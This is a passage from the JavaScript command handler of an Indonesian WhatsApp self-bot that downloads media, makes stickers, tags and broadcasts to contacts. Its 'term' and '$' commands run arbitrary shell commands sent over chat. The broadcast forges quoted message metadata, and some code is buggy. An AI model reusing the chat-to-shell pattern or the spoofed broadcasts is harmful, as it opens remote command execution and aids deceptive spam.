				} catch {
				  reply('Pack tidak terdaftar')
				}
				break
				
				case 'getvid':
				namastc = body.slice(8)
				try {
				buffer = fs.readFileSync(`./temp/video/${namastc}.mp4`)
				xdev.sendMessage(from, buffer, video, { quoted: dev, caption: `Result From Database : ${namastc}.mp4` })
				} catch {
				  reply('Pack tidak terdaftar')
				}
				break
				
				case 'getvn':
				namastc = body.slice(7)
				try {
				buffer = fs.readFileSync(`./temp/audio/${namastc}.mp3`)
				xdev.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: dev, ptt: true })
				} catch {
				  reply('Pack tidak terdaftar')
				}
break
 	case 'hidetag':
			if (!dev.key.fromMe & !isGroupAdmins) return reply(mess.admin)
			if (!isGroup) return reply(mess.only.group)
			var value = args.join(' ')
			var group = await xdev.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: dev
			}
			xdev.sendMessage(from, optionshidetag, text)
			break
			
	case 'play':
			if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
    		aramas = await yts(srch);
    		aramat = aramas.all 
   			var mulaikah = aramat[0].url							
                  try {
                    yta(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam devtuk link_`)
                        const captions = `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break  
                   case 'bc':

xdev.updatePresence(from, Presence.composing)

					if (!isOwner && !dev.key.fromMe) return reply(mess.only)

					if (args.length < 1) return reply('Teksnya?')

					anu = await xdev.chats.all()

					if (isMedia && !dev.message.videoMessage || isQuotedImage) {

						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)

						for (let _ of anu) {

							xdev.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `*BROADCAST BOT*\n\n${body.slice(4)}` })

						}

						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)

						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {

						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)

						for (let _ of anu) {

							xdev.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `*BROADCAST BOT*\n\n${body.slice(4)}` })

						}

						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)

						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {

						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)

						for (let _ of anu) {

							xdev.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `*BROADCAST BOT*\n\n${body.slice(4)}` })

						}

						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)

					} else {

						for (let _ of anu) {

							sendMess(_.jid, `${body.slice(4)}`)

						}

						reply(`Sukses mengirim Broadcast:\n${body.slice(4)}`)

					}

					break
        case 'video':
            if (args.length === 0) return reply(`Kirim perintah *${prefix}video* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
            aramas = await yts(srch);
            aramat = aramas.all 
            var mulaikah = aramat[0].url                            
                  try {
                    ytv(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam devtuk link_`)
                        const captions = `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break      
    case 'sticker': 
    case 'stiker':
    case 'sg':
    case 's':
            if (isImage || isQuotedImage) {
                    let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
                    let media = await xdev.downloadAndSaveMediaMessage(encmedia, `./stik/${sender}`)
                    await ffmpeg(`${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./stik/data.exif ./stik/${sender}.webp -o ./stik/${sender}.webp`, async (error) => {
                                    if (error) return reply(mess.error.api)
									xdev.sendMessage(from, fs.readFileSync(`./stik/${sender}.webp`), sticker, {quoted: dev})
									
                                    fs.unlinkSync(media)	
									fs.unlinkSync(`./stik/${sender}.webp`)	
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./stik/${sender}.webp`)
                } else if ((isMedia && dev.message.videoMessage.fileLength < 10000000 || isQuotedVideo && dev.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
                    let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
                    let media = await xdev.downloadAndSaveMediaMessage(encmedia, `./stik/${sender}`)
					
                        await ffmpeg(`${media}`)
							.inputFormat(media.split('.')[4])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./stik/data.exif ./stik/${sender}.webp -o ./stik/${sender}.webp`, async (error) => {
									if (error) return reply(mess.error.api)
									xdev.sendMessage(from, fs.readFileSync(`./stik/${sender}.webp`), sticker, {quoted:dev})
									
                                    fs.unlinkSync(media)
									fs.unlinkSync(`./stik/${sender}.webp`)
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./stik/${sender}.webp`)
                } else {
                    reply(`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
                }
            
            
                break
case 'shortlink':
if (!q) return replt('Linknya mana bg?')
tod = await fetchJson(`https://hardianto-chan.herokuapp.com/short/tiny?url=${q}`)
reply(tod.result.link)
break
            case 'addcmd': 
			case 'setcmd':{
                  if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
                  if (isQuotedSticker) {
                  if (!q) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
                  var kodenya = dev.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('hex')
                  addCmd(kodenya, q)
                  reply("_Success_")
                  } else {
                  reply('tag stickenya')
                  }
                  }
            break
            case 'delcmd':{
                  if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
                  if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
                  var kodenya = dev.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('hex')
                  _scommand.splice(getCommandPosition(kodenya), 1)
                  fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
                  reply("_Success_")
                  }
            break
            case 'listcmd':
let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
let cemde = [];
for (let i of _scommand) {
cemde.push(i.id)
teksnyee += `\n\n*•> ID :* ${i.id}\n*•> Cmd* : ${i.chats}`
}
mentions(teksnyee, cemde, true)
break
    case 'toimg':
			if (!isQuotedSticker) return reply('𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 !')
			reply(mess.wait)
			encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await xdev.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return reply('Yah gagal, coba ulangi ^_^')
			buffer = fs.readFileSync(ran)
			fakethumb(buffer,'NIH')
			fs.unlinkSync(ran)
			})
			break
	case 'ytsearch':
			if (args.length < 1) return reply('Tolong masukan query!')
			var srch = args.join('');
			try {
        	var aramas = await yts(srch);
   			} catch {
        	return await xdev.sendMessage(from, 'Error!', MessageType.text, dload)
    		}
    		aramat = aramas.all 
    		var tbuff = await getBuffer(aramat[0].image)
    		var ytresult = '';
    		ytresult += '「 *YOUTUBE SEARCH* 」'
    		ytresult += '\n________________________\n\n'
   			aramas.all.map((video) => {
        	ytresult += '❏ Title: ' + video.title + '\n'
            ytresult += '❏ Link: ' + video.url + '\n'
            ytresult += '❏ Durasi: ' + video.timestamp + '\n'
            ytresult += '❏ Upload: ' + video.ago + '\n________________________\n\n'
    		});
    		ytresult += '◩ *SELF-BOT*'
    		await fakethumb(tbuff,ytresult)
			break
	case 'setreply':
	case 'setfake':
            if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
			if (!q) return fakegroup(mess.wrongFormat)
			fake = q
			fakegroup(`Succes Mengganti Conversation Fake : ${q}`)
			break
	case 'setfakeimg':
    if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
        	if ((isMedia && !dev.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
			delb = await xdev.downloadMediaMessage(boij)
			fs.writeFileSync(`./stik/fake.jpeg`, delb)
			fakestatus('Sukses')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
	case 'setthumb':
    if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
	        if ((isMedia && !dev.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
			delb = await xdev.downloadMediaMessage(boij)
			fs.writeFileSync(`./stik/thumb.jpeg`, delb)
			fakestatus('Sukses')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
	case 'ytmp4':
			if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
			let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks2) return reply(mess.error.Iv)
				try {
				reply(mess.wait)
				ytv(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
				if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `*YTMP 4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam devtuk link_`)
				const captionsYtmp4 = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				sendMediaURL(from, thumb, captionsYtmp4)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
				})		
				})
				} catch (err) {
			    reply(mess.error.api)
				}
				break
	case 'emoji':
			if (!q) return fakegroup('emojinya?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[4].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
	case 'ytmp3':
			if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
			let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks) return reply(mess.error.Iv)
				try {
				reply(mess.wait)
				yta(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
			    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam devtuk link_`)
				const captions = `*YTMP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				sendMediaURL(from, thumb, captions)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
				})
				})
				} catch (err) {
				reply(mess.error.api)
				}
				break
    case 'image':
            if (args.length < 1) return reply('Masukan teks!')
            const gimg = args.join('');
            reply(mess.wait)
            gis(gimg, async (error, result) => {
            n = result
            images = n[Math.floor(Math.random() * n.length)].url
            xdev.sendMessage(from,{url:images},image,{quoted:dev})
            });
            break
 	case 'tiktok':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return fakegroup('Linknya?')
 		reply(mess.wait)
		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { wm, nowm, audio } = result
    		axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
    		.then(async (a) => {
    		me = `*Link* : ${a.data}`
		xdev.sendMessage(from,{url:`${nowm}`},video,{mimetype:'video/mp4',quoted:dev,caption:me})
		})
		})
     		.catch(e => console.log(e))
     		break
    case 'tiktokaudio':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return fakegroup('Linknya?')
 		reply(mess.wait)
 		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { audio} = result
            sendMediaURL(from,audio,'')
    		})
     		.catch(e => console.log(e))
     		break
    case 'brainly':
			if (args.length < 1) return reply('Pertanyaan apa')
          	brien = args.join(' ')
			brainly(`${brien}`).then(res => {
			teks = '❉───────────────────────❉\n'
			for (let Y of res.data) {
			teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
			}
			xdev.sendMessage(from, teks, text,{quoted:dev,detectLinks: false})                        
            })              
			break
    case 'ig':
        if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(mess.Iv)
        if (!q) return fakegroup('Linknya?')
        reply(mess.wait)
	    hx.igdl(args[0])
	    .then(async(result) => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    xdev.sendMessage(from,link,video,{quoted: dev,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    xdev.sendMessage(from,link,image,{quoted: dev,caption: `Type : ${i.type}`})                  
                }
            }
            });
	    break
    case 'igstalk':
            if (!q) return fakegroup('Usernamenya?')
            ig.fetchUser(`${args.join(' ')}`).then(Y => {
            console.log(`${args.join(' ')}`)
            ten = `${Y.profile_pic_url_hd}`
            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.followers}\n*Following* : ${Y.following}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
            sendMediaURL(from,ten,teks) 
            })      
            break    
    case 'fb':
            if (!q) return reply('Linknya?')
            if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(mess.Iv)
            reply(mess.wait)
            te = args.join(' ')
            hx.fbdown(`${te}`)
            .then(G => {
            ten = `${G.HD}`
            sendMediaURL(from,ten,`*Link video_normal* : ${G.Normal_video}`)
            })
            break    
	case 'term':
    if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
			if (!q) return fakegroup(mess.wrongFormat)
			exec(q, (err, stdout) => {
			if (err) return fakegroup(`SELF-BOT:~ ${err}`)
			if (stdout) {
			fakegroup(stdout)
			}
			})
		    break 
   /* case 'join':
    if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            hen = args[0]
            if (!q) return fakestatus('Masukan link group')
            var codeInvite = hen.split('https://chat.whatsapp.com/')[1]
            if (!codeInvite) return fakegroup ('pastikan link sudah benar!')
            var response = await xdev.acceptInvite(codeInvite)
            fakestatus('SUKSES')
            } catch {
            fakegroup('LINK ERROR!')
            }
            break*/
	case 'join':
			if (!dev.key.fromMe && !isOwner) return reply(mess.owner) 
			if (args.length < 1) return reply('Link nya mana?')
			xdev.query({
			json:["action", "invite", `${args[0].replace('https://chat.whatsapp.com/','')}`]
			})
			reply(`Sukses Join`)
			break
    case'twitter':
            if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
            if (!q) return fakegroup('Linknya?')
            ten = args[0]
            var res = await hx.twitter(`${ten}`)
            ren = `${g.HD}`
            sendMediaURL(from,ren,'DONE')
            break
    case 'runtime':
    case 'test':
            run = process.uptime() 
            teks = `${kyun(run)}`
            xdev.sendMessage(from, teks, text, {quoted: fgc})
            break  
	case 'speed':
	case 'ping':
			const timestamp = speed();
			const latensi = speed() - timestamp
			exec(`neofetch --stdout`, (error, stdout, stderr) => {
			const child = stdout.toString('utf-8')
			const teks = child.replace(/Memory:/, "Ram:")
			const pingnya = `*${teks}Speed: ${latensi.toFixed(4)} Second*`
			xdev.sendMessage(from, pingnya, text, {quoted: ftroli})
			})
			break  
    case 'totag':
    if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
            if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !dev.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4',
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !dev.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    case 'tomp4':
	case 'tovideo':
            if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            owgi = await xdev.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result,'Done')
            })
            }else {
            reply('reply stiker')
            }
            fs.unlinkSync(owgi)
            break
    case 'tourl':
            if ((isMedia && !dev.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            owgi = await xdev.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('kirim/reply gambar/video')
            }
            break	
    /*case 'nulis':
    if (!q) return reply('Textnya mana gan?')
    reply(mess.wait)
    tod = await getBuffer(`https://hardianto-chan.herokuapp.com/nulis?text=${q}`)
    xdev.sendMessage(from, tod, image, {quoted: ftroli, caption: 'Awas ketahuan kak :v'})
    break*/
    case 'inspect':
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            if (!q) return reply('masukan link wa')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return reply('pastikan itu link https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await xdev.query({ 
            json: ["query", "invite",net],
            expect200:true })
            let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
*Id desc* : ${descId}
${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
           for ( let y of participants) {
             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
             }
             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             xdev.sendMessage(from,par,text,{quoted:dev,contextInfo:{mentionedJid:jids}})
             } catch {
             reply('Link error')
             }
             break
             
            case 'setppbot':
			    xdev.updatePresence(from, Presence.composing)
					if (!isOwner) return reply3('Kalau Bukan Owner Gak Usah Banyak Tingkah Deh')
					xdev.updatePresence(from, Presence.composing) 
					if (!isQuotedImage) return reply(`Kirim gambar dengan caption ${prefix}setbotpp atau tag gambar yang sudah dikirim`)
					enmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await xdev.downloadAndSaveMediaMessage(enmedia)
					await xdev.updateProfilePicture(botNumber, media)
					reply('Makasih profil barunya😗')
					break
					
										case 'sider':
infom = await xdev.messageInfo(from, dev.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
shape = '▢'
teks = `Telah Dibaca Oleh :\n\n`
for(let i of infom.reads){
teks += shape+' ' + '@' + i.jid.split('@')[0] + '\n'
teks += `┗━ ${shape} Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
break

					case 'banchat':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
//if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (isBanchat) return reply(`udah di ban`)
bancht.push(from)
fs.writeFileSync('./database/banchat.json', JSON.stringify(bancht))
reply(`Bot berhasil Ban di group ini`)
break
case 'infoall': 
case 'tagall':
if (!isGroupAdmins && !isOwner) return reply(mess.admin)
if (!isGroup) return reply(mess.only.group)
if(!q) return reply('Ingfonya apa?')
var nom = dev.participant
members_id = []
	teks = '\n'
	for (let mem of groupMembers) {
	teks += `┣ *▢*   @${mem.jid.split('@')[0]}\n`
	members_id.push(mem.jid)
	}
mentions(`*From :@${nom.split("@s.whatsapp.net")[0]}*\n\n*Info :  ${q}*\n\n*Total Member :* ${groupMembers.length} \n\n┏━ *「 ${fake1} 」* `+teks+`┗━ *「 ${fake1} 」* `, members_id, false)
break

 
default:
if (button == 'CREATOR') {
console.log('CREATOR')
let inilist = []
for (let i of ownerNumber) {
const vname = xdev.contacts[i] != undefined ? xdev.contacts[i].vname || xdev.contacts[i].notify : undefined
inilist.push({
"displayName": 'Ham-Botzz',
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${xdev.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
hehe = await xdev.sendMessage(from, {
"displayName": `${inilist.length} kontak`,
"contacts": inilist 
}, 'contactsArrayMessage', { quoted: dev })
xdev.sendMessage(from,'Nih Kak owner ku',text,{quoted: hehe})
}
if (button == 'INSTAGRAM') {
console.log('INSTAGRAM')
xdev.sendMessage(from, `*「 INSTAGRAM 」*\nSupport bot dengan Follow Instagram\n> https://instagram.com/oceanvictory_id`, text, {quoted: dev})
}
if (button == 'REST API') {
console.log('REST API')
xdev.sendMessage(from, `*Nih kak rest api yang digunakan oleh X - Dev Team Dan juga free*\n\nhttps://hardianto-chan.herokuapp.com/api\n\n*Gunakan dengan bijak dan jangan spam yah kak 🙏🏻*`, text, {"contextInfo": {text: 'HelloWorld',"forwardingScore": 3,isForwarded: true,sendEphemeral: true,mentionedJid: [sender],"externalAdReply": {"title": `Hallo kak ${pushname}`,"body": ``,"previewType": "PHOTO","thumbnailUrl": `https://telegra.ph/file/a082de791ef8aff96ec24.jpg`,"thumbnail": "","sourceUrl": ""}}, quoted: dev})
}
if (budy.startsWith('$')){
if (!dev.key.fromMe && !isOwner) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`@X - Dev Team:~ ${err}`)
